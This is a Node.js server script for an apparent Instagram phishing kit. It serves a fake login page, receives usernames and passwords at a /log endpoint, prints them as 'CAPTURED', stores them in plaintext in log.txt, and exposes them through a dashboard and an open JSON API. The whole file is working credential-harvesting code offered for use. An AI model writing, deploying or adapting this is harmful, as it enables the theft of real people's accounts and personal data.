const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 8080;
const logFilePath = path.join(__dirname, 'log.txt');
let capturedHistory = [];

// Load existing data on startup
if (fs.existsSync(logFilePath)) {
    try {
        const lines = fs.readFileSync(logFilePath, 'utf8').split('\n').filter(l => l.trim());
        lines.forEach(line => { try { capturedHistory.push(JSON.parse(line)); } catch (e) { } });
        console.log(`Loaded ${capturedHistory.length} previous records.`);
    } catch (e) { console.log('Starting fresh.'); }
}

const server = http.createServer((req, res) => {
    // HANDLE CORS PREFLIGHT (This fixes the connection error)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        return res.end();
    }

    // Serve Instagram page
    if (req.method === 'GET' && req.url === '/') {
        const filePath = path.join(__dirname, 'index.html');
        fs.readFile(filePath, (err, content) => {
            if (err) { res.writeHead(500); res.end('Error: index.html not found'); }
            else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content); }
        });
    }

    // Receive credentials
    else if (req.method === 'POST' && req.url === '/log') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const record = { username: data.username, password: data.password, timestamp: new Date().toISOString() };
                capturedHistory.push(record);
                fs.appendFileSync(logFilePath, JSON.stringify(record) + '\n');

                console.log(`\n🚨 CAPTURED: ${data.username} / ${data.password}`);

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success' }));
            } catch (e) { res.writeHead(400); res.end('Bad Request'); }
        });
    }

    // Serve dashboard
    else if (req.method === 'GET' && req.url === '/dashboard') {
        const filePath = path.join(__dirname, 'dashboard.html');
        fs.readFile(filePath, (err, content) => {
            if (err) { res.writeHead(500); res.end('Error: dashboard.html not found'); }
            else { res.writeHead(200, { 'Content-Type': 'text/html' }); res.end(content); }
        });
    }

    // API - get all data
    else if (req.method === 'GET' && req.url === '/api/data') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(capturedHistory));
    }

    else { res.writeHead(404); res.end('Not Found'); }
});

server.listen(PORT, () => {
    console.log(`\n🚀 SERVER STARTED ON PORT 8080 🚀`);
    console.log(`👉 Open Chrome: http://localhost:8080\n`);
});